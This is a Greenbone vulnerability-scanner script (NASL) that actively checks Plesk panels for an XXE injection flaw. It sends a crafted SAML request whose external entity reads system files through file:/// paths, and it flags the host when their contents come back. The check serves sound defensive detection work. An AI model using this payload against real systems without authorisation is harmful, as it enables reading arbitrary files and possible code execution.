# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:parallels:parallels_plesk_panel";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105046");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2014-06-13 14:56:42 +0200 (Fri, 13 Jun 2014)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Plesk <= 10.4.4 / 11.x <= 1.0.9 XXE Injection Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_plesk_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("plesk/http/detected");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to retrieve arbitrary
  files from the vulnerable system or to execute code in the context of the affected application.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"solution", value:"Ask the vendor for an update.");

  script_tag(name:"summary", value:"Plesk is prone to an XML external entity (XXE) injection
  vulnerability.");

  script_tag(name:"affected", value:"Plesk versions 10.4.4 and 11.0.9. Other versions may also be
  affected.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/33736");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("url_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/relay";

files = traversal_files();
vtstrings = get_vt_strings();
vtstring = vtstrings["lowercase"];
useragent = http_get_user_agent();

host = http_host_name(port:port);

foreach pattern( keys( files ) ) {

  file = files[pattern];

  xxe = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE doc [ <!ENTITY xxe SYSTEM "file:///' + file + '"> ] >' +
        '<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"' +
        'ID="' +  rand_str( length:42, charset:'a-f0-9')  + '" Version="2.0">' +
        '<saml:Issuer>&xxe;</saml:Issuer></samlp:AuthnRequest>';

  xxe = urlencode( str:base64( str:xxe ) );
  rs = urlencode( str:base64( str:get_host_ip() ) );

  ex = 'SAMLRequest=' + xxe  + '&response_url=http://' + vtstring + '&RelayState=' + rs + '&RefererScheme=https&RefererHost=https://' + host + '&RefererPort=' + port;

  len = strlen( ex );

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Host: ' + host + '\r\n' +
        'Accept: */*\r\n' +
        'Referer: https://' + host + url + '\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        '\r\n' +
        ex;
  buf = http_keepalive_send_recv( port:port, data:req );

  if( egrep( string:buf, pattern:pattern, icase:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
